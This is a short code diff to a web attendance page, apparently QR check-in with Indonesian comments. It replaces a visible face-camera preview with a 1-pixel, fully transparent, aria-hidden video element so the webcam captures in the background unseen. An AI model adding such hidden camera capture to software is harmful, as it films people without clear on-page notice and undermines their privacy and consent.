@@ -139,17 +139,10 @@
                         </div>
                     </div>
 
-                    {{-- Dual Camera: Face Webcam (hidden by default, shown if setting aktif & 2 kamera tersedia) --}}
-                    <div id="face-camera-container" class="hidden mt-3 max-w-lg mx-auto">
-                        <div class="bg-gray-900 rounded-xl p-3 shadow-xl">
-                            <div class="flex items-center gap-2 mb-2">
-                                <div class="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
-                                <p class="text-white text-xs font-semibold">📷 Kamera Wajah (Dual Mode Aktif)</p>
-                            </div>
-                            <video id="face-camera" class="w-full rounded-lg bg-black" autoplay muted playsinline
-                                   style="max-height:240px; object-fit:cover;"></video>
-                        </div>
-                    </div>
+                    {{-- Dual Camera: Face Webcam (HIDDEN — hanya untuk capture background, tidak ditampilkan) --}}
+                    <video id="face-camera" autoplay muted playsinline
+                           style="display:none; width:1px; height:1px; position:absolute; opacity:0;"
+                           aria-hidden="true"></video>
 
 
                     {{-- Modern Instructions --}}
@@ -626,8 +619,7 @@
                 faceVideo.srcObject = stream;
                 fotoStream = stream;
 
-                document.getElementById('face-camera-container').classList.remove('hidden');
-                console.log('📷 Dual camera aktif! QR idx:', QR_CAM_IDX, '| Foto idx:', PHO_CAM_IDX);
+                console.log('📷 Dual camera aktif (background)! QR idx:', QR_CAM_IDX, '| Foto idx:', PHO_CAM_IDX);
 
             } catch (err) {
                 console.error('❌ Gagal init kamera wajah:', err.message);
